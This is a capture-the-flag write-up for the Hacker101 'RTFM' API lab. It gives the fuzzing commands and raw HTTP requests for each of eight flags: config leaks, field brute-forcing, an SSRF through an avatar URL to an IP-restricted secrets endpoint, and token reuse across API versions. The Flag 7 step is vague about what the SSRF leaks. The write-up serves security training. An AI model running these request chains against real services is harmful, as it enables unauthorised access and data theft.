# 📖 RTFM

> **Platform:** Hacker101 CTF &nbsp;|&nbsp; **Difficulty:** `Moderate` &nbsp;|&nbsp; **Flags:** `8/8` ✅

---

## ⛓️ Attack Chain

```
ffuf root → swagger.json (v2) → Flag 0
→ Register user via Repeater → Flag 1
→ feroxbuster /api/v1/ → /config (private_key) → Flag 2
→ Login v1 → X-Token header → /user/posts/1 → Flag 3
→ Burp Intruder on PUT /api/v1/user → avatar field → SSRF on /api/v1/secrets → Flag 4
→ X-Session reused as X-Token across API versions → Flag 5
→ post-analytics endpoint enumeration → Flag 6
→ admin user-list via X-Session → Flag 7
```

---

## 🔍 Application Overview

A REST API with two versions (`/api/v1/` and `/api/v2/`) that don't share authentication consistently. The homepage only returns: *"API base located at /api/v1/"*. Everything else has to be discovered through fuzzing and endpoint enumeration with Burp.

---

## 🚩 Flag 0 — swagger.json Discovery

**Step 1 — Fuzz the root directory:**

```bash
ffuf -u https://LABURL/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
```

Found:
```
/api/v2/swagger.json  → 200 OK
```

**Step 2 — Send to Repeater and request:**

```http
GET /api/v2/swagger.json HTTP/2
Host: LABURL
```

The JSON response contains `"flag": "FLAG"` directly. Also lists all available v2 endpoints:

```
/api/v2/user
/api/v2/user/login
/api/v2/admin/user-list
/api/v2/user/posts/{id}
```

---

## 🚩 Flag 1 — User Registration

`/api/v2/user` accepts unauthenticated POST. In Repeater:

```http
POST /api/v2/user HTTP/2
Host: LABURL
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=hcini&password=hcini
```

Response includes the flag and confirms account creation.

---

## 🚩 Flag 2 — Config Endpoint Leak

**Step 1 — Fuzz /api/v1/ with feroxbuster:**

```bash
feroxbuster -u https://LABURL/api/v1/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```

Found:
```
/api/v1/config   → 200 OK
/api/v1/secrets  → 403 Forbidden ("Access not allowed from your IP address")
/api/v1/user     → 400 Bad Request ("X-Token header authentication missing")
```

**Step 2 — Request /config in Repeater:**

```http
GET /api/v1/config HTTP/2
Host: LABURL
```

Response: `{"server":"Neptune","version":"1.3.94","private_key":"FLAG"}` — Flag 2 is the `private_key`.

---

## 🚩 Flag 3 — Authenticated Post via X-Token

**Step 1 — Login on v1 to get a token:**

```http
POST /api/v1/user/login HTTP/2
Host: LABURL
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=hcini&password=hcini
```

Response: `{"token":"TOKEN"}`

**Step 2 — Add the token as a header and request your post:**

```http
GET /api/v1/user/posts/1 HTTP/2
Host: LABURL
X-Token: TOKEN
```

Response: `{"id":1,"post":"You got the Post: FLAG","analytics":"/api/v1/post-analytics/HASH"}` — Flag 3 is in the `post` field.

---

## 🚩 Flag 4 — SSRF via Avatar Field (Burp Intruder)

`/api/v1/secrets` returns 403 — IP-restricted, same pattern as the X-Forwarded-For lab.

**Step 1 — Send a PUT request with no body to Repeater:**

```http
PUT /api/v1/user HTTP/2
Host: LABURL
X-Token: TOKEN
Content-Length: 0
```

Response: `{"error":"No updatable fields supplied"}`

**Step 2 — Send to Intruder, brute-force field names:**

```http
PUT /api/v1/user HTTP/2
Host: LABURL
X-Token: TOKEN
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

§field§=test
```

Payload set: SecLists `common.txt` or a custom list of common field names (`avatar`, `bio`, `email`, `role`, `level`, `admin`...).

Filter results — the only request that **doesn't** return `"No updatable fields supplied"` is:

```
field = avatar
```

**Step 3 — Confirm in Repeater:**

```http
PUT /api/v1/user HTTP/2
Host: LABURL
X-Token: TOKEN
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

avatar=test
```

Response: `{"error":"Avatar resource should start with http:// or https://"}`

**Step 4 — SSRF: point avatar at the restricted endpoint:**

```http
PUT /api/v1/user HTTP/2
Host: LABURL
X-Token: TOKEN
Content-Type: application/x-www-form-urlencoded
Content-Length: 60

avatar=https://LABURL/api/v1/secrets
```

The server fetches `/api/v1/secrets` itself, bypassing the IP restriction. Flag 4 is returned in the response.

---

## 🚩 Flag 5 — X-Session Reused as X-Token

**Step 1 — Login on v2 to get a session:**

```http
POST /api/v2/user/login HTTP/2
Host: LABURL
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=hcini&password=hcini
```

Response: `{"session":"SESSION"}`

**Step 2 — Use this v2 SESSION value as X-Token on a v1 endpoint:**

```http
GET /api/v1/user/posts/1 HTTP/2
Host: LABURL
X-Token: SESSION
```

The v1 API accepts the v2 session — cross-version authentication confusion. Flag 5 appears.

---

## 🚩 Flag 6 — Post Analytics Enumeration

From Flag 3's response, the `analytics` field gave a path:

```http
GET /api/v1/post-analytics/HASH HTTP/2
Host: LABURL
X-Token: TOKEN
```

Response: `{"hash":"HASH","post":1,"views":34373}`

List all campaigns:

```http
GET /api/v1/post-analytics/ HTTP/2
Host: LABURL
X-Token: TOKEN
```

Enumerate the returned hashes — Flag 6 is found in one of the campaign entries.

---

## 🚩 Flag 7 — Admin User List via X-Session

```http
GET /api/v2/admin/user-list HTTP/2
Host: LABURL
X-Session: SESSION
```

Response: `{"error":"Your user level needs to be an admin"}`

Use the SSRF from Flag 4 to fetch `/api/v1/secrets` — this leaks admin credentials or an admin session. Authenticate as admin and repeat:

```http
GET /api/v2/admin/user-list HTTP/2
Host: LABURL
X-Session: ADMIN_SESSION
```

Flag 7 appears in the user list response.

---

## 🧠 Why It Works

| Vulnerability | Root Cause |
|---|---|
| Information Disclosure | `swagger.json` and `/config` exposed publicly with sensitive data |
| Mass Assignment / Field Brute-forcing | `avatar` field undocumented but updatable via PUT |
| SSRF | `avatar` accepts arbitrary URLs — server fetches them, bypassing IP restrictions on `/secrets` |
| Auth Token Confusion | `X-Session` (v2) accepted as `X-Token` (v1) — inconsistent auth between API versions |
| Broken Access Control | Admin endpoints reachable once SSRF leaks admin credentials |

---

## 📋 Tools & Wordlists

```bash
# Root fuzzing
ffuf -u https://LABURL/FUZZ -w api-endpoints.txt

# Endpoint fuzzing
feroxbuster -u https://LABURL/api/v1/ -w common.txt

# Field name brute-force (Burp Intruder)
PUT /api/v1/user HTTP/2
X-Token: TOKEN
Content-Type: application/x-www-form-urlencoded

§field§=test
```

---

## Note on Flag 4 (avatar field)

If `avatar` doesn't work directly, fuzz the field name with Burp Intruder first:

```http
PUT /api/v1/user HTTP/2
Host: LABURL
X-Token: TOKEN
Content-Type: application/x-www-form-urlencoded
Content-Length: 9

§test§=test
```

Use a parameter wordlist, filter out `"No updatable fields supplied"`. Test each surviving field individually until you get the avatar/URL validation error, then SSRF `/api/v1/secrets`.
